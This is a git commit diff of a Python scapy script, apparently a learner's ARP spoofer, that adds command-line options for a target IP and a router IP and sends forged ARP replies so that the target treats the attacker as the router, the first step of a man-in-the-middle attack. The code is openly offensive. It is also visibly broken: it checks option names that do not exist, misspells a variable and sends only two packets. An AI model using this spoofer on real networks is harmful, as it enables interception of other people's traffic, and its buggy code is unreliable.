238b697082ce9ffc1599e3ae7ac3b0be1dc92ad6
Viktor <swifrorlilko@gmail.com>
2020-02-01 21:27:23 +0200

    adding parser args

--- net-spoof/spoofer.py
+++ net-spoof/spoofer.py
@@ -1,18 +1,31 @@
 import scapy.all as scapy
+import optparse
 
+def getArgs():
+    parser = optparse.OptionParser()
+    parser.add_option("-i", "--targetIP", dest="targetIp", help="include target ip")
+    parser.add_option("-r", "--routerIp", dest="routerIp", help="include router ip")
+    (opt, arg) = parser.parse_args()
+    if not opt.interface:
+        parser.error("[-] Please specify an targetIp. Use --help for information.")
+    elif not opt.new_mac:
+        parser.error("[-] Please specify routerIp. Use --help for information.")
+
+    return opt
 def getMac(ip):
     arpRequest = scapy.ARP(pdst=ip)
     broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arpRequestBroadcast = broadcast/arpRequest
+    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
+    return answeredList[0][1].hwsrc
 
-    answeredList[0][1].hwsrc
-    clientsList = []
-    for el in answeredList:
-        client_dict = {"ip": el[1].psrc, "mac": el[1].hwsrc}
-        clientsList.append(client_disct)
-    return client_list
 
 def spoof(targetIp, spoofIp):
-    packet = scapy.ARP(op=2, pdst=targetIp, hwdst="00:23:d1:d0:cd:21", psrc=spoofIp)
+    targetMac = getMac(targetIp)
+    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMact, psrc=spoofIp)
     scapy.send(packet)
 
+opt = getArgs()
+
+spoof(opt.targetIp, opt.routerIp)
+spoof(opt.targetIp, opt.routerIp)
